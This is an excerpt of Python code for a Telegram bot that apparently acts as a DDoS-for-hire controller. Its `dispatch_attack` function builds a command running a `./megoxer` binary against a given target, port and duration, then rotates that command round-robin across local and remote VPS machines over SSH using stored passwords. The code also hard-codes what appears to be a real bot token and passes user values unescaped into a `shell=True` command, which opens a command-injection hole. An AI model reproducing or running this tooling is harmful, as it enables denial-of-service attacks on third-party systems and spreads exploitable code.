...
bot = telebot.TeleBot('8013938312:AAFWwEQVwExQ0wgDdxI6DijiVkYCcu7AZOg')  # Replace with your bot token
...
def dispatch_attack(target, port, time):
    ...
    command = f"./megoxer {target} {port} {time} 200"

    for _ in range(total_vps):
        vps = vps_list[vps_index]
        used_index = vps_index
        vps_index = (vps_index + 1) % total_vps  # Rotate before break

        if vps['type'] == 'local':
            subprocess.Popen(command, shell=True)
            print(f"[Round-Robin] VPS {used_index+1} (local) selected.")
            break
        elif vps['type'] == 'remote':
            success = execute_remote_ssh(vps['ip'], vps['username'], vps['password'], command)
            if success:
                print(f"[Round-Robin] VPS {used_index+1} ({vps['ip']}) selected.")
                break
